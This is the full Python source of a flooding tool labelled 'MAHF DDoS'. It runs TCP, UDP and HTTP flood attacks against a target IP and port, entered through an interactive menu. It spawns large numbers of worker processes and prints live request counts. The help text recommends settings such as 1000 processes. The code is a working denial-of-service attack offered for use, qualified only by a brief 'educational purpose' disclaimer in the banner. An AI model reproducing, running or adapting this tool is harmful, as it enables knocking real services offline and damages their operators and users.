import socket
import threading
import multiprocessing
import requests
import random
import string
import time
import signal
import sys
from multiprocessing import Value, Event

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def tcp_flood(ip, port, success_counter, fail_counter, stop_event):
    while not stop_event.is_set():
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.send(generate_random_string(1024).encode())
            sock.close()
            with success_counter.get_lock():
                success_counter.value += 1
        except:
            with fail_counter.get_lock():
                fail_counter.value += 1

def udp_flood(ip, port, success_counter, fail_counter, stop_event):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_event.is_set():
        try:
            sock.sendto(generate_random_string(1024).encode(), (ip, port))
            with success_counter.get_lock():
                success_counter.value += 1
        except:
            with fail_counter.get_lock():
                fail_counter.value += 1

def http_flood(url, success_counter, fail_counter, stop_event):
    while not stop_event.is_set():
        try:
            response = requests.get(url)
            if response.status_code == 200:
                with success_counter.get_lock():
                    success_counter.value += 1
            else:
                with fail_counter.get_lock():
                    fail_counter.value += 1
        except:
            with fail_counter.get_lock():
                fail_counter.value += 1

def worker(ip, port, mode, url, success_counter, fail_counter, stop_event):
    if mode == 'tcp':
        tcp_flood(ip, port, success_counter, fail_counter, stop_event)
    elif mode == 'udp':
        udp_flood(ip, port, success_counter, fail_counter, stop_event)
    elif mode == 'http':
        http_flood(url, success_counter, fail_counter, stop_event)

def display_counter(success_counter, fail_counter, stop_event):
    while not stop_event.is_set():
        time.sleep(1)
        print(f"\rSuccessful requests: {success_counter.value} | Failed requests: {fail_counter.value}  :", end='')

def start_attack(ip, port, mode, num_workers, num_processes, stop_event):
    url = f"http://{ip}:{port}" if mode == 'http' else None
    success_counter = Value('i', 0)
    fail_counter = Value('i', 0)

    display_thread = threading.Thread(target=display_counter, args=(success_counter, fail_counter, stop_event))
    display_thread.start()

    processes = []
    for _ in range(num_processes):
        for _ in range(num_workers):
            if mode == 'http':
                process = multiprocessing.Process(target=http_flood, args=(url, success_counter, fail_counter, stop_event))
            else:
                process = multiprocessing.Process(target=worker, args=(ip, port, mode, url, success_counter, fail_counter, stop_event))
            process.start()
            processes.append(process)

    return processes

def stop_attack(processes, stop_event):
    print('Stopping attack...')
    stop_event.set()
    for process in processes:
        process.terminate()
        process.join()
    print('Attack stopped.')

def show_help():
    print("""
                 __   __  _______  __   __  _______   
                |  |_|  ||   _   ||  | |  ||       |  
                |       ||  |_|  ||  |_|  ||    ___|  
                |       ||       ||       ||   |___   
                |       ||       ||       ||    ___|  
                | ||_|| ||   _   ||   _   ||   |      
                |_|   |_||__| |__||__| |__||___|      
                ______   ______   _______  _______   
                |      | |      | |       ||       |  
                |  _    ||  _    ||   _   ||  _____|  writer:Mahfazzalin Showon Reza
                | | |   || | |   ||  | |  || |_____   use it only educational purpose
                | |_|   || |_|   ||  |_|  ||_____  |  and if you have written permision.
                |       ||       ||       | _____| |  if you have any issue or error leave a comment on
                |______| |______| |_______||_______|  https://github.com/Mahfazzalin/MAHF_DDoS/issues/1

    1st: write "start" for starting the attack process
    2nd: Enter target ip address and hit enter
    3rd: enter target port number and hit enter
    4th: Enter a mode(tcp,udp,http) and hit enter
    5th: Enter worker number and hit enter. (recommanded 10) based on your pc configaration
    6th: Enter process amount and hit enter. (remommanded 1000) based on your pc configaration
    
    it will start the attack and showing the request amount. for stoping the attack write "stop" hit 
    enter. it will stop your attack.
    
    Help Menu:
    - start: Start the attack
    - stop: Stop the attack
    - exit: Exit the tool
    - help: Show this help menu
    """)

if __name__ == "__main__":
    show_help()
    stop_event = Event()
    processes = []

    while True:
        command = input("\nEnter a command: ").strip().lower()
        if command == 'start':
            if stop_event.is_set():
                stop_event.clear()
            ip = input("Enter IP address: ")
            port = int(input("Enter port number: "))
            mode = input("Enter mode (tcp, udp, http): ").lower()
            num_workers = int(input("Enter number of workers: "))
            num_processes = int(input("Enter number of processes: "))
            processes = start_attack(ip, port, mode, num_workers, num_processes, stop_event)
        elif command == 'stop':
            stop_attack(processes, stop_event)
        elif command == 'exit':
            stop_attack(processes, stop_event)
            print("You're successfully exited the tool.")
            sys.exit(0)
        elif command == 'help':
            show_help()
        else:
            print("Invalid command. Type 'help' for the list of commands.")
